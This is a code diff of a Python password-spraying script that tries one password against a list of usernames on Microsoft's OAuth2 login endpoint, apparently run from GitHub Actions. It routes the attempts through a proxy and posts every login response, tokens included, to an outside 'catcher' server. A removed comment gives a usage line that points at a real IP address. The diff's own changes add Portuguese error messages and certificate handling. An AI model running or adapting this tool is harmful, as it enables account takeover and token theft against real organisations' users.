@@ -1,5 +1,3 @@
-# this demo performs pass spray in microsoft
-## python3 kicker.py -u userlist.txt -p "P1assword123" -c http://3.95.37.64/wow-amazing -s
 import requests
 import os
 from urllib3.exceptions import InsecureRequestWarning
@@ -11,14 +9,22 @@ if missing_env_vars:
     missing_vars_str = ", ".join(missing_env_vars)
     raise ValueError(f"Missing environment variables: {missing_vars_str}")
 
-# TODO: add target and other data here later to make this more modular
 # Fetch environment variables
 usernames = os.getenv("USERNAMES").split(',')
 password = os.getenv("PASSWORD")
 catcher_URL = os.getenv("CATCHERURL")
 catcher_uses_TLS_str = os.getenv("CATCHERTLS")
 catcher_uses_TLS = catcher_uses_TLS_str.lower() == "true"
-ssl_certificate = os.getenv("REQUESTS_CA_BUNDLE")
+
+# --- CORREÇÃO: LER DO GITHUB ACTIONS ---
+ca_bundle_path = os.getenv("REQUESTS_CA_BUNDLE")
+
+if not ca_bundle_path:
+    print("[-] AVISO: Variavel REQUESTS_CA_BUNDLE nao encontrada. Usando fallback inseguro ou caminho padrao.")
+    # Fallback para teste local se necessario, mas no Github Actions usara a variavel
+    ca_bundle_path = "rootCA.crt"
+
+print(f"[*] Usando certificado SSL em: {ca_bundle_path}")
 
 def send_login_request(username, password):
     url = "https://login.microsoft.com/common/oauth2/token"
@@ -43,27 +49,27 @@ def send_login_request(username, password):
             proxies={"http": "http://changeme:changeme@127.0.0.1:1234", "https": "http://changeme:changeme@127.0.0.1:1234"},
             headers=post_headers,
             data=body_params,
-            verify=ssl_certificate,
-            timeout=5
+            # --- AQUI ESTA A CORRECAO ---
+            verify=ca_bundle_path, 
+            timeout=10
         )
         return response.status_code, response.text
 
-    except requests.RequestException:
+    except requests.RequestException as e:
+        print(f"[-] Erro na requisicao (Username: {username}): {e}")
         return None, None
 
 def send_data_to_catcher(data, use_ssl):
     if not use_ssl:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     try:
-        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
-        print("[+] Data sent to the catcher.")
-    except requests.RequestException:
-        print(f"[-] Failed to send data to the catcher.")
+        response = requests.post(catcher_URL, json=data, timeout=5, verify=use_ssl)
+        print(f"[+] Data sent to the catcher. Status: {response.status_code}")
+    except requests.RequestException as e:
+        print(f"[-] Failed to send data to the catcher: {e}")
         
-# Initialize an empty list to store results
 results = []
 
-# Iterate over each username and perform login request
 for username in usernames:
     login_response_code, login_response = send_login_request(username, password)
     result = {
@@ -78,5 +84,4 @@ for username in usernames:
         result["response"] = "Github actions workflow failed to perform login request"
     results.append(result)
 
-# Send all results to the catcher
 send_data_to_catcher(results, use_ssl=catcher_uses_TLS)
